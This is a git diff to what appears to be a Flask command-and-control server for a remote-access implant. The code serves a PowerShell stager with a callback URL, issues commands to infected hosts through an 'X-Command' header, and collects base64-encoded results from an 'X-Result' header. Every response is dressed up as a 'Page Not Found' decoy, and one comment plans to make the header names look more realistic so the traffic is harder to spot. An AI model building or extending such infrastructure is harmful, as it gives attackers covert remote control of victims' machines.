@@ -28,13 +28,14 @@ def add_header( r):
 def Stager():
     # This needs to return the implant!
     print("@@",request.values['user'])
-    a=db.Get_ImplantKey(request.values['user'])
-    print(a)
+    a=db.Get_ImplantFromKey(request.values['user'])
+    #print(a)
     if a:
         from jinja2 import Environment, FileSystemLoader
         env = Environment(loader=FileSystemLoader('implant_core'))
         template = env.get_template('jinja_fudge.ps1')
         print(a.callback_url,a.implant_key)
+        db.Update_ImplantLastCheckIn(request.values['user'])
         output_from_parsed_template = template.render(url=a.callback_url, port=5000, uii=a.implant_key)
     else:
         return "404", 404
@@ -48,28 +49,27 @@ def Stager():
 def ImplantCheckIn():
     # Should check ANY connection in against all configured implant options (IE body, header etc)
     #   unlike they 'headers' options which is configured in the current iteration.
-    # for x in request.headers:
-        # print(x)
+    #print(request.headers)
     if 'X-Implant' in request.headers:
-        print("###",request.headers['X-Implant'])
-        UII = request.headers['X-Implant']
-    #ImplantManager(a)
-    #print(len(Imp.QueuedCommands))
-    a = Imp.IssueCommand(UII)
-    Resp = make_response("Page Not Found")
-    Resp.headers["X-Command"] =a
-    ## print(Resp)
+        db.Update_ImplantLastCheckIn(request.headers['X-Implant'])
+        CmdToExecute = Imp.IssueCommand(request.headers['X-Implant'])
+        #print("::",CmdToExecute)
+        Resp = make_response("Page Not Found")
+        if CmdToExecute !="==":
+            print("ImplantCheckIn: ",CmdToExecute)
+        Resp.headers["X-Command"] = CmdToExecute
+    else:
+
+        Resp = make_response("Page Not Found")
+        Resp.headers["X-Command"] = "=="
     return Resp
 
 @app.route("/help",methods=['GET','POST'])
 def ImplantCommandResult():
-    # print(request.headers)
     if "X-Result" in request.headers:
-        res = request.headers['X-Result']
-        #Fucking windows encode UTF-16
-        a = base64.b64decode(request.headers["X-Result"]).decode('utf-16')
-        # print(a)
-        Imp.CommandResponse(a)
+        # -- X-Result is a placeholder header and should be changed to a more realistic value
+        DecodedResponse = base64.b64decode(request.headers["X-Result"]).decode('utf-16')
+        Imp.CommandResponse(DecodedResponse)
     return "Page Not Found"
 
 
